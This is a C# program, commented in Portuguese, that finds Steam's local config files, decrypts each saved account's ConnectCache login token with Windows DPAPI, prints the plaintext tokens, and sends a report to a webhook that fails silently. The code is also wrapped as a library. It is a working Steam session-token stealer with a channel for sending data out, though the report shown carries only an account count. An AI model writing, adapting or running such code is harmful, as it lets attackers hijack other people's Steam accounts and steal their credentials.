using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Net.Http;
using System.Threading.Tasks;
using System.Security.Cryptography;

namespace SteamVdfReader
{
    class Program
    {
        static async Task Main()
        {
            var tokens = SteamReader.GetDecryptedSteamTokens();

            if (tokens.Count == 0)
            {
                Console.WriteLine("Nenhum token encontrado.");
            }
            else
            {
                Console.WriteLine("Contas encontradas:\n");

                foreach (var t in tokens)
                {
                    string steamID = t.Key;
                    string tokenData = t.Value; // "accountName.decryptedToken" ou null

                    string account = "(desconhecido)";
                    string token = "(não encontrado)";
                    bool tokenPresente = false;

                    if (!string.IsNullOrEmpty(tokenData))
                    {
                        int dotIndex = tokenData.IndexOf('.');

                        if (dotIndex > 0)
                        {
                            account = tokenData.Substring(0, dotIndex);
                            token = tokenData.Substring(dotIndex + 1);
                        }

                        tokenPresente = true;
                    }

                    Console.WriteLine("SteamID: " + steamID);
                    Console.WriteLine("Account: " + account);
                    Console.WriteLine("Token presente: " + (tokenPresente ? "SIM" : "NÃO"));

                    if (tokenPresente)
                        Console.WriteLine("Token: " + token);

                    Console.WriteLine(new string('-', 35));
                }
            }
            // Enviar resumo para webhook (variável de ambiente recomendada / DPAPI fallback)
            try
            {
                await SteamVdfLib.SendSummaryAsync(tokens);
            }
            catch { /* falha não crítica */ }

            Console.ReadLine();
        }

        // SendWebhookAsync moved to SteamVdfLib for library usage
    }

    // Public wrapper to expose functionality when building as a library (DLL)
    public static class SteamVdfLib
    {
        // Expose tokens retrieval
        public static Dictionary<string, string> GetTokens()
        {
            return SteamReader.GetDecryptedSteamTokens();
        }

        // Send summary using environment variable, then DPAPI-protected file fallback
        public static async Task SendSummaryAsync(Dictionary<string, string> tokens)
        {
            string message = tokens == null || tokens.Count == 0 ? "Nenhum token encontrado." : $"Foram encontradas {tokens.Count} contas.";

            // First try environment variable
            string webhook = Environment.GetEnvironmentVariable("STEAM_WEBHOOK");

            // Then try DPAPI-protected file in AppData
            if (string.IsNullOrEmpty(webhook))
            {
                string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SteamVdfReader", "webhook.prot");
                webhook = SecretStore.GetProtectedWebhookFromFile(path);
            }

            if (string.IsNullOrEmpty(webhook))
            {
                Console.WriteLine("Webhook não definido. Defina STEAM_WEBHOOK ou guarde o webhook protegido com SecretStore.ProtectWebhookToFile.");
                return;
            }

            using (HttpClient client = new HttpClient())
            {
                var json = "{\"content\":\"" + message.Replace("\"", "\\\"") + "\"}";
                var data = new StringContent(json, Encoding.UTF8, "application/json");
                try { await client.PostAsync(webhook, data); } catch { }
            }
        }
    }

    // DPAPI helper to protect/unprotect webhook on the current user account
    public static class SecretStore
    {
        // Use Windows DPAPI via CryptProtectData / CryptUnprotectData
        [StructLayout(LayoutKind.Sequential)]
        private struct DATA_BLOB { public int cbData; public IntPtr pbData; }

        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CryptProtectData(ref DATA_BLOB pDataIn, string szDataDescr, ref DATA_BLOB pOptionalEntropy,
            IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, out DATA_BLOB pDataOut);

        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, StringBuilder ppszDataOut, ref DATA_BLOB pOptionalEntropy,
            IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, out DATA_BLOB pDataOut);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LocalFree(IntPtr hMem);

        // Protect webhook and write to file (creates directory if needed)
        public static void ProtectWebhookToFile(string webhook, string filePath)
        {
            if (string.IsNullOrEmpty(webhook) || string.IsNullOrEmpty(filePath)) return;

            byte[] buffer = Encoding.UTF8.GetBytes(webhook);
            IntPtr pbDataIn = IntPtr.Zero;
            IntPtr pbDataOut = IntPtr.Zero;

            try
            {
                pbDataIn = Marshal.AllocHGlobal(buffer.Length);
                Marshal.Copy(buffer, 0, pbDataIn, buffer.Length);

                DATA_BLOB dataIn = new DATA_BLOB { cbData = buffer.Length, pbData = pbDataIn };
                DATA_BLOB outBlob = new DATA_BLOB();
                DATA_BLOB emptyEntropy = new DATA_BLOB();

                bool ok = CryptProtectData(ref dataIn, null, ref emptyEntropy, IntPtr.Zero, IntPtr.Zero, 0, out outBlob);
                if (!ok || outBlob.cbData == 0 || outBlob.pbData == IntPtr.Zero) return;

                byte[] encrypted = new byte[outBlob.cbData];
                Marshal.Copy(outBlob.pbData, encrypted, 0, outBlob.cbData);

                string dir = Path.GetDirectoryName(filePath);
                if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                File.WriteAllBytes(filePath, encrypted);
            }
            catch { }
            finally
            {
                if (pbDataIn != IntPtr.Zero) Marshal.FreeHGlobal(pbDataIn);
                // out blob freed by LocalFree called by CryptProtectData? free if allocated
            }
        }

        // Read and unprotect webhook from file
        public static string GetProtectedWebhookFromFile(string filePath)
        {
            if (string.IsNullOrEmpty(filePath) || !File.Exists(filePath)) return null;

            byte[] encrypted = File.ReadAllBytes(filePath);
            IntPtr pbDataIn = IntPtr.Zero;

            try
            {
                pbDataIn = Marshal.AllocHGlobal(encrypted.Length);
                Marshal.Copy(encrypted, 0, pbDataIn, encrypted.Length);

                DATA_BLOB dataIn = new DATA_BLOB { cbData = encrypted.Length, pbData = pbDataIn };
                DATA_BLOB outBlob = new DATA_BLOB();
                DATA_BLOB emptyEntropy = new DATA_BLOB();

                bool ok = CryptUnprotectData(ref dataIn, null, ref emptyEntropy, IntPtr.Zero, IntPtr.Zero, 0, out outBlob);
                if (!ok || outBlob.cbData == 0 || outBlob.pbData == IntPtr.Zero) return null;

                byte[] decoded = new byte[outBlob.cbData];
                Marshal.Copy(outBlob.pbData, decoded, 0, outBlob.cbData);

                // free the memory allocated by CryptUnprotectData
                if (outBlob.pbData != IntPtr.Zero) LocalFree(outBlob.pbData);

                return Encoding.UTF8.GetString(decoded);
            }
            catch { return null; }
            finally
            {
                if (pbDataIn != IntPtr.Zero) Marshal.FreeHGlobal(pbDataIn);
            }
        }
    }

    public static class SteamReader
    {
        public static Dictionary<string, string> GetDecryptedSteamTokens()
        {
            var result = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

            // Abrir Steam Registry (suportando Valve ou valve)
            var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Valve\Steam") ??
                      Registry.CurrentUser.OpenSubKey(@"SOFTWARE\valve\Steam");
            if (key == null) return result;

            string steamPath = key.GetValue("SteamPath") as string;
            if (string.IsNullOrEmpty(steamPath)) return result;

            string loginusers = Path.Combine(steamPath, "config", "loginusers.vdf");
            string localvdf = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam", "local.vdf");

            if (!File.Exists(loginusers) || !File.Exists(localvdf)) return result;

            var loginDoc = new VdfParser(File.ReadAllText(loginusers)).Parse();
            var localDoc = new VdfParser(File.ReadAllText(localvdf)).Parse();

            if (!loginDoc.ContainsKey("users")) return result;
            var users = loginDoc["users"] as Dictionary<string, object>;

            // Busca ConnectCache de forma universal
            Dictionary<string, object> connectCache = FindConnectCache(localDoc);
            if (connectCache == null) return result;

            foreach (var u in users)
            {
                string steamID = u.Key;
                var data = u.Value as Dictionary<string, object>;
                if (data == null || !data.ContainsKey("AccountName")) continue;

                string accountName = data["AccountName"] as string;
                if (string.IsNullOrEmpty(accountName)) continue;

                string cacheKey = SteamTokenDecryptor.GetConnectCacheKey(accountName);
                if (!connectCache.ContainsKey(cacheKey)) continue;

                string encrypted = connectCache[cacheKey] as string;
                Console.WriteLine("Encrypted token: " + encrypted);
                string decrypted = SteamTokenDecryptor.DecryptSteamToken(encrypted, accountName);

                result[steamID] = !string.IsNullOrEmpty(decrypted) ? accountName + "." + decrypted : null;
            }

            return result;
        }

        // Detecta ConnectCache independente de maiúsculas/minúsculas
        private static Dictionary<string, object> FindConnectCache(Dictionary<string, object> doc)
        {
            try
            {
                foreach (var kv in doc)
                {
                    if (kv.Key.Equals("MachineUserConfigStore", StringComparison.OrdinalIgnoreCase))
                    {
                        var m = kv.Value as Dictionary<string, object>;
                        if (m != null && m.TryGetValue("Software", out object softwareObj))
                        {
                            var software = softwareObj as Dictionary<string, object>;
                            if (software != null && software.TryGetValue("Valve", out object valveObj))
                            {
                                var valve = valveObj as Dictionary<string, object>;
                                if (valve != null && valve.TryGetValue("Steam", out object steamObj))
                                {
                                    var steam = steamObj as Dictionary<string, object>;
                                    if (steam != null && steam.TryGetValue("ConnectCache", out object connectCacheObj))
                                        return connectCacheObj as Dictionary<string, object>;
                                }
                            }
                        }
                    }
                }
            }
            catch { }

            return null;
        }
    }

    public static class SteamTokenDecryptor
    {
        public static string DecryptSteamToken(string token, string accountName)
        {
            if (string.IsNullOrEmpty(token)) return null;

            byte[] array;
            try { array = HexToBytes(token); } catch { return null; }

            IntPtr pbDataIn = IntPtr.Zero;
            IntPtr pbEntropy = IntPtr.Zero;
            DATA_BLOB dataOut = new DATA_BLOB();

            try
            {
                pbDataIn = Marshal.AllocHGlobal(array.Length);
                Marshal.Copy(array, 0, pbDataIn, array.Length);

                DATA_BLOB dataIn = new DATA_BLOB { cbData = array.Length, pbData = pbDataIn };
                DATA_BLOB entropyBlob = new DATA_BLOB();

                if (!string.IsNullOrEmpty(accountName))
                {
                    var entropy = Encoding.UTF8.GetBytes(accountName);
                    pbEntropy = Marshal.AllocHGlobal(entropy.Length);
                    Marshal.Copy(entropy, 0, pbEntropy, entropy.Length);
                    entropyBlob.cbData = entropy.Length;
                    entropyBlob.pbData = pbEntropy;
                }

                bool ok = CryptUnprotectData(ref dataIn, null, ref entropyBlob, IntPtr.Zero, IntPtr.Zero, 0, out dataOut);
                if (!ok || dataOut.cbData == 0 || dataOut.pbData == IntPtr.Zero)
                {
                    // fallback sem entropy
                    DATA_BLOB empty = new DATA_BLOB();
                    ok = CryptUnprotectData(ref dataIn, null, ref empty, IntPtr.Zero, IntPtr.Zero, 0, out dataOut);
                    if (!ok || dataOut.cbData == 0 || dataOut.pbData == IntPtr.Zero) return null;
                }

                byte[] decoded = new byte[dataOut.cbData];
                Marshal.Copy(dataOut.pbData, decoded, 0, dataOut.cbData);

                try { return Encoding.UTF8.GetString(decoded); }
                catch { return Convert.ToBase64String(decoded); }
            }
            finally
            {
                if (pbDataIn != IntPtr.Zero) Marshal.FreeHGlobal(pbDataIn);
                if (pbEntropy != IntPtr.Zero) Marshal.FreeHGlobal(pbEntropy);
                if (dataOut.pbData != IntPtr.Zero) LocalFree(dataOut.pbData);
            }
        }

        public static string GetConnectCacheKey(string accountName)
        {
            if (string.IsNullOrEmpty(accountName)) return null;
            byte[] bytes = Encoding.UTF8.GetBytes(accountName);
            uint crc = CalculateCrc32(bytes);
            return crc.ToString("x") + "1";
        }

        private static uint CalculateCrc32(byte[] data)
        {
            uint crc = 0xffffffff;
            foreach (byte b in data)
            {
                crc ^= b;
                for (int i = 0; i < 8; i++)
                    crc = (crc & 1) != 0 ? (crc >> 1) ^ 0xedb88320 : crc >> 1;
            }
            return ~crc;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct DATA_BLOB { public int cbData; public IntPtr pbData; }

        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, StringBuilder ppszDataOut, ref DATA_BLOB pOptionalEntropy,
            IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, out DATA_BLOB pDataOut);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LocalFree(IntPtr hMem);

        private static byte[] HexToBytes(string hex)
        {
            hex = hex.Replace(" ", "").Trim();
            if (hex.StartsWith("0x", StringComparison.OrdinalIgnoreCase)) hex = hex.Substring(2);
            if (hex.Length % 2 != 0) hex = "0" + hex;
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
                bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            return bytes;
        }
    }

    public class VdfParser
    {
        private readonly string content;
        private int pos;

        public VdfParser(string content) => this.content = content;

        public Dictionary<string, object> Parse()
        {
            SkipWhitespace();
            Dictionary<string, object> root = new Dictionary<string, object>();
            while (pos < content.Length)
            {
                SkipWhitespace();
                if (pos >= content.Length) break;
                string key = ParseString();
                SkipWhitespace();
                if (Peek() == '{') root[key] = ParseObject();
                else root[key] = ParseString();
            }
            return root;
        }

        private Dictionary<string, object> ParseObject()
        {
            Dictionary<string, object> obj = new Dictionary<string, object>();
            Expect('{');
            while (true)
            {
                SkipWhitespace();
                if (Peek() == '}') { pos++; break; }
                string key = ParseString();
                SkipWhitespace();
                if (Peek() == '{') obj[key] = ParseObject();
                else obj[key] = ParseString();
            }
            return obj;
        }

        private string ParseString()
        {
            Expect('"');
            StringBuilder sb = new StringBuilder();
            while (Peek() != '"') sb.Append(content[pos++]);
            Expect('"');
            return sb.ToString();
        }

        private void SkipWhitespace() { while (pos < content.Length && char.IsWhiteSpace(content[pos])) pos++; }
        private char Peek() => pos >= content.Length ? '\0' : content[pos];
        private void Expect(char c) { if (Peek() != c) throw new Exception("Unexpected char"); pos++; }
    }

    public static class Crypto
    {
        public static string Decrypt(string cipherText, string key)
        {
            if (string.IsNullOrEmpty(cipherText) || string.IsNullOrEmpty(key)) return null;

            byte[] buffer;
            try { buffer = Convert.FromBase64String(cipherText); } catch { return null; }

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = new byte[16];

                using (MemoryStream ms = new MemoryStream(buffer))
                using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read))
                using (StreamReader sr = new StreamReader(cs))
                {
                    try { return sr.ReadToEnd(); } catch { return null; }
                }
            }
        }
    }
}